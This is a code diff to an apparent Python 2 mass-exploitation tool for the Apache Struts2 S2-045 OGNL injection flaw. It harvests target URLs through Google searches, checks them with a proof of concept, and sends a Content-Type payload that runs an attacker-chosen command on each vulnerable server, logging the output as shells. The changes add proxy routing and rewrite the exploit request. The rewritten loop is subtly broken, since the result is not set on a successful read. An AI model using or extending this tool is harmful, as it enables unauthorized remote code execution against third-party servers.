@@ -9,6 +9,8 @@ import sys
 import os
 import time
 import socket
+import httplib
+import urllib2
 import requests
 import ConfigParser
 import threading, Queue
@@ -33,10 +35,12 @@ if cp.has_option('http', 'http_addr') and cp.has_option('http', 'http_port'):
     http_addr = cp.get('http', 'http_addr')
     http_port = int(cp.get('http', 'http_port'))
     proxies['https'] = 'https://%s:%d' % (http_addr, http_port)
+    proxies['http'] = 'https://%s:%d' % (http_addr, http_port)
 elif cp.has_option('socks', 'socks_addr') and cp.has_option('socks', 'socks_port'):
     socks_addr = cp.get('socks', 'socks_addr')
     socks_port = int(cp.get('socks', 'socks_port'))
     proxies['https'] = 'socks5://%s:%d' % (socks_addr, socks_port)
+    proxies['http'] = 'socks5://%s:%d' % (socks_addr, socks_port)
 
 
 class SubThread(threading.Thread):
@@ -135,7 +139,7 @@ class GoogleAPI:
                     break
                 except Exception, e:
                     with lock:
-                        print '\033[0;31m[!] [SEARCH_ERROR]\033[0m', e
+                        print '\033[0;31m[!] [SEARCH_ERROR] %s\033[0m' % str(e)
                     self.random_sleep()
                     retry = retry - 1
                     continue
@@ -168,7 +172,7 @@ def crawler():
         api.search(keyword, num=expect_num)
 
 
-def exploit(timeout, cmd):
+def exploit(cmd):
     payload = "%{(#_='multipart/form-data')."
     payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
     payload += "(#_memberAccess?"
@@ -195,16 +199,13 @@ def exploit(timeout, cmd):
     while True:
         url = vuln_queue.get()
         try:
-            response = requests.get(url, headers=headers, proxies=proxies, timeout=timeout)
-            result = response.text.strip()
-        except Exception, e:
-            with lock:
-                print '\033[1;31m[!] [EXP_ERROR] %s\033[0m' % url
-                print '\033[1;31m[!] [EXP_ERROR]\033[0m', e
-        else:
-            with lock:
-                print '\033[1;32m[*] [SHELL] %s\033[0m' % result
-                print '\033[1;32m[*] [SHELL] %s\033[0m' % url
+            request = urllib2.Request(url, headers=headers)
+            page = urllib2.urlopen(request).read()
+        except httplib.IncompleteRead, e:
+            result = e.partial.strip()
+        with lock:
+            print '\033[1;32m[*] [SHELL] %s\033[0m' % result
+            print '\033[1;32m[*] [SHELL] %s\033[0m' % url
             with open('./vulnerable.txt', 'a') as vulnerable:
                 vulnerable.write(result+'\t'+url+'\n')
 
@@ -234,7 +235,7 @@ def poccheck(timeout):
         except Exception, e:
             with lock:
                 print '\033[1;31m[!] [POC_ERROR] %s\033[0m' % url
-                print '\033[1;31m[!] [POC_ERROR]\033[0m', e
+                print '\033[1;31m[!] [POC_ERROR] %s\033[0m' % str(e)
         else:
             if S2_045['key'] in res_html:
                 with lock:
@@ -286,7 +287,7 @@ def main():
         poc_thread = SubThread(poccheck, (timeout,))
         poc_thread.daemon = True
         poc_thread.start()
-        exp_thread = SubThread(exploit, (timeout, cmd))
+        exp_thread = SubThread(exploit, (cmd,))
         exp_thread.daemon = True
         exp_thread.start()
         crawler()
